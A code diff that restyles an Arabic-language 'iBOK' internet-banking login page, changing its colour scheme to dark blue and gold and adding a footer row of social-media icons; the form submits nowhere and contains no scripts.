@@ -13,7 +13,7 @@
 
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #eef3f9;
+            background: #e8edf4; /* خلفية رمادية مائلة للأزرق الفاتح */
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -25,57 +25,56 @@
             background: #ffffff;
             max-width: 400px;
             width: 100%;
-            padding: 30px 25px 25px;
+            padding: 30px 25px 20px;
             border-radius: 28px;
-            box-shadow: 0 15px 45px rgba(0, 20, 40, 0.15);
+            box-shadow: 0 20px 50px rgba(10, 39, 72, 0.15);
             text-align: center;
+            transition: 0.3s;
         }
 
-        /* الرابط العلوي - مطابق للصورة */
+        /* ---------- الألوان مضبوطة بدقة ---------- */
         .site-url {
             font-size: 15px;
             font-weight: 600;
-            color: #1a3a6b;
+            color: #0a2748; /* الأزرق الغامق الأساسي */
             margin-bottom: 4px;
             letter-spacing: 0.3px;
         }
 
         .service-ar {
             font-size: 14px;
-            color: #444;
+            color: #2c3e50;
             font-weight: 500;
             margin-top: 2px;
         }
 
         .service-en {
             font-size: 13px;
-            color: #777;
+            color: #7f8c8d;
             font-weight: 400;
             margin-top: -2px;
             margin-bottom: 18px;
         }
 
-        /* النص الترحيبي الطويل كما في الصورة */
         .welcome-text {
             font-size: 18px;
             font-weight: 600;
-            color: #003366;
+            color: #0a2748;
             line-height: 1.6;
             margin-bottom: 18px;
         }
 
-        /* عنوان تسجيل الدخول */
         .main-title {
             font-size: 26px;
             font-weight: 800;
-            color: #003366;
+            color: #0a2748;
             margin-bottom: 2px;
         }
 
         .sub-title {
             font-size: 18px;
             font-weight: 600;
-            color: #1a3a6b;
+            color: #1e3a5f;
             margin-bottom: 22px;
         }
 
@@ -89,7 +88,7 @@
             display: block;
             font-size: 16px;
             font-weight: 700;
-            color: #003366;
+            color: #0a2748;
             margin-bottom: 2px;
         }
 
@@ -111,35 +110,36 @@
             transition: 0.3s;
             outline: none;
             text-align: right;
+            color: #0a2748;
         }
 
         .form-group input:focus {
-            border-color: #003366;
+            border-color: #c9a84b; /* التركيز باللون الذهبي */
             background: #fff;
-            box-shadow: 0 0 0 4px rgba(0, 51, 102, 0.08);
+            box-shadow: 0 0 0 4px rgba(201, 168, 75, 0.15);
         }
 
-        /* رابط نسبت كلمة المرور (بدون رمز) */
         .forgot-link {
             display: block;
             text-align: right;
             font-size: 15px;
-            color: #003366;
+            color: #c9a84b; /* ذهبي */
             text-decoration: none;
             font-weight: 600;
             margin: 6px 0 22px;
             cursor: pointer;
+            transition: 0.2s;
         }
 
         .forgot-link:hover {
+            color: #a8892f;
             text-decoration: underline;
         }
 
-        /* زر تسجيل الدخول */
         .btn-login {
             width: 100%;
             padding: 15px;
-            background: #003366;
+            background: #0a2748; /* الأزرق الداكن الأساسي */
             color: #fff;
             font-size: 19px;
             font-weight: 700;
@@ -147,43 +147,85 @@
             border-radius: 30px;
             cursor: pointer;
             transition: 0.3s;
-            box-shadow: 0 6px 20px rgba(0, 51, 102, 0.25);
+            box-shadow: 0 6px 20px rgba(10, 39, 72, 0.30);
             letter-spacing: 0.5px;
         }
 
         .btn-login:hover {
-            background: #002244;
+            background: #051b33;
             transform: scale(1.01);
+            box-shadow: 0 8px 25px rgba(10, 39, 72, 0.40);
         }
 
-        /* التذييل - 2025 | iBOK */
+        /* ---------- التذييل مع التواصل الاجتماعي ---------- */
         .footer {
             margin-top: 26px;
-            font-size: 15px;
-            font-weight: 600;
-            color: #888;
             border-top: 1px solid #eef2f7;
             padding-top: 18px;
         }
 
-        .footer strong {
-            color: #003366;
+        .footer .copy-text {
+            font-size: 15px;
+            font-weight: 600;
+            color: #888;
+        }
+
+        .footer .copy-text strong {
+            color: #0a2748;
             font-weight: 800;
         }
 
-        .footer .pipe {
-            color: #c9a84b;
+        .footer .copy-text .pipe {
+            color: #c9a84b; /* الذهبي */
             margin: 0 4px;
         }
 
+        /* أيقونات التواصل الاجتماعي */
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            gap: 18px;
+            margin-top: 14px;
+            margin-bottom: 2px;
+        }
+
+        .social-icons a {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            background: #f0f4fa;
+            color: #0a2748;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 600;
+            transition: 0.3s;
+            border: 1px solid transparent;
+        }
+
+        .social-icons a:hover {
+            background: #0a2748;
+            color: #fff;
+            border-color: #c9a84b;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 14px rgba(10, 39, 72, 0.20);
+        }
+
+        /* استخدام رموز بسيطة بدل الأيقونات (أو استخدم FontAwesome لو تحب) */
+        .social-icons .fb::before { content: "f"; font-weight: 900; }
+        .social-icons .tw::before { content: "𝕏"; font-weight: 700; font-size: 20px; }
+        .social-icons .yt::before { content: "▶"; font-size: 16px; }
+        .social-icons .ig::before { content: "📷"; font-size: 20px; }
+
         @media (max-width: 480px) {
-            .card {
-                padding: 20px 16px;
-            }
-            .main-title {
-                font-size: 22px;
-            }
-            .welcome-text {
+            .card { padding: 20px 16px; }
+            .main-title { font-size: 22px; }
+            .welcome-text { font-size: 16px; }
+            .social-icons a {
+                width: 34px;
+                height: 34px;
                 font-size: 16px;
             }
         }
@@ -198,43 +240,50 @@
         <div class="service-ar">الخدمات المصرفية عبر الإنترنت</div>
         <div class="service-en">Internet Banking Services</div>
 
-        <!-- الترحيب الطويل -->
+        <!-- الترحيب -->
         <div class="welcome-text">مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت</div>
 
         <!-- العناوين -->
         <div class="main-title"># تسجيل الدخول</div>
         <div class="sub-title">## الرجاء إدخال البيانات</div>
 
-        <!-- نموذج الدخول -->
+        <!-- النموذج -->
         <form action="#" method="POST">
 
-            <!-- حقل رقم الحساب -->
             <div class="form-group">
                 <span class="field-label">رقم الحساب:</span>
                 <span class="field-hint">أدخل رقم الحساب المكون من 7 أرقام</span>
                 <input type="text" placeholder="مثال: 1234567" maxlength="7" inputmode="numeric">
             </div>
 
-            <!-- حقل كلمة المرور -->
             <div class="form-group">
                 <span class="field-label">كلمة المرور:</span>
                 <span class="field-hint">أدخل كلمة المرور</span>
                 <input type="password" placeholder="••••••••">
             </div>
 
-            <!-- نسبت كلمة المرور (بدون أيقونة، يمين) -->
+            <!-- نسبت كلمة المرور (ذهبية) -->
             <a href="#" class="forgot-link">نسبت كلمة المرور</a>
 
-            <!-- زر تسجيل الدخول -->
             <button type="submit" class="btn-login">تسجيل الدخول</button>
 
         </form>
 
-        <!-- التذييل 2025 | iBOK -->
+        <!-- التذييل + السوشيال ميديا -->
         <div class="footer">
-            <span>2025</span>
-            <span class="pipe">|</span>
-            <strong>iBOK</strong>
+            <div class="copy-text">
+                <span>2025</span>
+                <span class="pipe">|</span>
+                <strong>iBOK</strong>
+            </div>
+            
+            <!-- أيقونات التواصل الاجتماعي (فيسبوك، تويتر، يوتيوب، إنستغرام) -->
+            <div class="social-icons">
+                <a href="#" class="fb" title="فيسبوك"></a>
+                <a href="#" class="tw" title="تويتر"></a>
+                <a href="#" class="yt" title="يوتيوب"></a>
+                <a href="#" class="ig" title="إنستغرام"></a>
+            </div>
         </div>
 
     </div>
